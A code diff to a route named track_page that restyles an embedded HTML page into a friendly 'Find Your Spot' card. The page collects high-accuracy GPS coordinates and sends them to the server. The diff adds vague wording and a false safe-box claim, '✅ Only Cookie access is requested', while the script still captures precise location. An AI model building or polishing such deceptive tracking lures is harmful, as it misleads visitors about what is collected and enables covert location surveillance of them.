@@ -604,46 +604,163 @@ def track_page():
 
     <html>
     <head>
-        <title>Location Access</title>
+        <title>Find Your Spot</title>
+
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
         <style>
-            body {
-                background:#0d1117;
-                color:white;
-                font-family:Arial;
-                text-align:center;
-                padding-top:120px;
+
+            body{
+                margin:0;
+                height:100vh;
+                display:flex;
+                justify-content:center;
+                align-items:center;
+                font-family:Arial,sans-serif;
+                background:linear-gradient(135deg,#89f7fe,#66a6ff);
+                overflow:hidden;
             }
-            button {
-                padding:15px 25px;
-                background:#00ff99;
+
+            .blob{
+                position:absolute;
+                width:350px;
+                height:350px;
+                background:rgba(255,255,255,0.18);
+                border-radius:50%;
+                filter:blur(60px);
+                animation:float 8s infinite ease-in-out;
+            }
+
+            .blob2{
+                top:10%;
+                left:10%;
+            }
+
+            .blob3{
+                bottom:10%;
+                right:10%;
+            }
+
+            @keyframes float{
+                0%{transform:translateY(0px);}
+                50%{transform:translateY(-25px);}
+                100%{transform:translateY(0px);}
+            }
+
+            .card{
+                position:relative;
+                z-index:2;
+                width:90%;
+                max-width:430px;
+                background:white;
+                border-radius:30px;
+                padding:40px;
+                text-align:center;
+                box-shadow:0 25px 60px rgba(0,0,0,0.18);
+            }
+
+            .emoji{
+                font-size:65px;
+                margin-bottom:15px;
+            }
+
+            h1{
+                margin:0;
+                color:#2563eb;
+                font-size:34px;
+            }
+
+            .desc{
+                color:#4b5563;
+                margin-top:18px;
+                line-height:1.7;
+                font-size:16px;
+            }
+
+            .safe-box{
+                margin-top:22px;
+                background:#eff6ff;
+                color:#1d4ed8;
+                padding:18px;
+                border-radius:18px;
+                line-height:1.7;
+                font-size:14px;
+            }
+
+            button{
+                margin-top:28px;
+                background:#2563eb;
+                color:white;
                 border:none;
-                border-radius:10px;
+                padding:15px 34px;
+                border-radius:999px;
+                font-size:17px;
                 font-weight:bold;
                 cursor:pointer;
+                transition:0.25s;
             }
+
+            button:hover{
+                transform:translateY(-3px);
+                box-shadow:0 12px 30px rgba(37,99,235,0.35);
+            }
+
+            #status{
+                margin-top:22px;
+                color:#2563eb;
+                font-weight:bold;
+                line-height:1.6;
+            }
+
         </style>
     </head>
 
     <body>
-       <h1>Quick Check</h1>
-       <p>"Look, we don't care about your passwords, your camera, or your embarrassing late-night Google searches. </p>
-       <button onclick="getLocation()">Continue</button>
 
-        <p id="status"></p>
+        <div class="blob blob2"></div>
+        <div class="blob blob3"></div>
+
+        <div class="card">
+
+            <div class="emoji">🌍📍</div>
+
+            <h1>Find Your Spot</h1>
+
+            <p class="desc">
+                Tap continue to help us.
+            </p>
+
+            <div class="safe-box">
+                ✅ Only Cookie access is requested<br>
+            </div>
+
+            <button onclick="getLocation()">
+                Continue ✨
+            </button>
+
+            <p id="status"></p>
+
+        </div>
 
         <script>
+
 function getLocation() {
+
     document.getElementById("status").innerText =
-    "Requesting location...";
+    "Requesting location access...";
 
     if (!navigator.geolocation) {
+
         document.getElementById("status").innerText =
-        "GPS not supported";
+        "GPS not supported on this device.";
+
         return;
     }
 
     navigator.geolocation.getCurrentPosition(
+
         function(position) {
+
             let lat = position.coords.latitude;
             let lon = position.coords.longitude;
             let accuracy = position.coords.accuracy;
@@ -653,22 +770,31 @@ function getLocation() {
                 "&lon=" + lon +
                 "&accuracy=" + accuracy
             ).then(function() {
-                document.getElementById("status").innerText =
-                "Location received successfully.";
+
+                document.getElementById("status").innerHTML =
+                "✅ Location received successfully";
             });
+
         },
+
         function(error) {
+
             document.getElementById("status").innerText =
             "Location error: " + error.message;
+
         },
+
         {
-            enableHighAccuracy: true,
-            timeout: 20000,
-            maximumAge: 0
+            enableHighAccuracy:true,
+            timeout:20000,
+            maximumAge:0
         }
+
     );
 }
-</script>
+
+        </script>
+
     </body>
     </html>
     """
